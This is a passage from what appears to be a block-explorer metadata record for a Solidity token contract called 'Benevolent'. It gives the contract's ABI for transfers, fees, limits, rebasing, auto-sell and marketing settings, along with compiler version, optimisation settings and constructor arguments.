TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"allot\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"markting\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"addL\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nft\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountNftLeft\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"minPart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxPart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"parts\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"exDividend\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transfer\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getToken0Price\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getToken1Price\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"ispair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"positionMax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualRebase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"marketingAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"marketingShare\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"multiSend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"process\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rebaseEndTotalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rebaseIsAdd\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rebaseRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"recoverERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"markting\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"addL\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nft\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"internalType\":\"struct MktCap.Allot\",\"name\":\"allotConfig\",\"type\":\"tuple\"},{\"components\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"minPart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxPart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"parts\",\"type\":\"uint256\"}],\"internalType\":\"struct MktCap.autoConfig\",\"name\":\"sellconfig\",\"type\":\"tuple\"},{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"share\",\"type\":\"uint256[]\"}],\"name\":\"setAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"markting\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"addL\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nft\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"internalType\":\"struct MktCap.Allot\",\"name\":\"allot_\",\"type\":\"tuple\"}],\"name\":\"setAllot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_flag\",\"type\":\"bool\"}],\"name\":\"setAutoRebase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"components\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"minPart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxPart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"parts\",\"type\":\"uint256\"}],\"internalType\":\"struct MktCap.autoConfig\",\"name\":\"autoSell_\",\"type\":\"tuple\"}],\"name\":\"setAutoSellConfig\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"list\",\"type\":\"uint256[]\"},{\"internalType\":\"bool\",\"name\":\"tf\",\"type\":\"bool\"}],\"name\":\"setExDividend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"tf\",\"type\":\"uint256\"}],\"name\":\"setExFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transfer\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"internalType\":\"struct Token.Fees\",\"name\":\"fees_\",\"type\":\"tuple\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"positionMax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"share\",\"type\":\"uint256[]\"}],\"name\":\"setMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"setPairs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rebaseRate_\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"rebaseIsAdd_\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"rebaseEndTotalSupply_\",\"type\":\"uint256\"}],\"name\":\"setRebase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setinb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setminReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"baseToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"nftToken\",\"type\":\"address\"},{\"components\":[{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transfer\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"internalType\":\"struct Token.Fees\",\"name\":\"fees_\",\"type\":\"tuple\"}],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"steadyHolders\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalDistributed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"name\":\"unSetPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000659fa0000000000000000000000000000000000000000000000000000000000000000a42656e65766f6c656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a42656e65766f6c656e7400000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c31bb5b9223dcbf0a6ac9be14a3cb900fb57ca08d5857809a31b8a24055314eb"}